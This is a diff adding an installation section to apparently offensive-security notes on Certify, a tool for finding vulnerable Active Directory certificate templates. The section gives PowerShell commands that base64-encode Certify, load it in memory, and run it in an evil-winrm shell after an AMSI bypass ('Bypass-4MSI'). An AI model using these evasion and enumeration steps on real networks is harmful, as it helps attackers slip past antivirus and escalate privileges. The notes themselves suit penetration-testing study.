@@ -18,6 +18,24 @@ Find Certificate Authorities (CA's) and vulnerable templates with [Certify](htt
 
 ## Installation
 
+Run certify with through PowerShell
+Run this to get base64 of certify (can run `pwsh` to do it in kali):
+
+```
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
+```
+
+create .ps1 script with the following:
+```
+$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
+[Certify.Program]::Main("find /vulnerable /outfile:C:\Users\e.black\Documents\FILE.txt".Split())
+```
+Use evil winrm bypass and run the powershell
+In evil winrm shell:
+```
+Bypass-4MSI
+./certify.ps1
+```
 
 ## Commands
 Find Certificate Authorities (CA's):
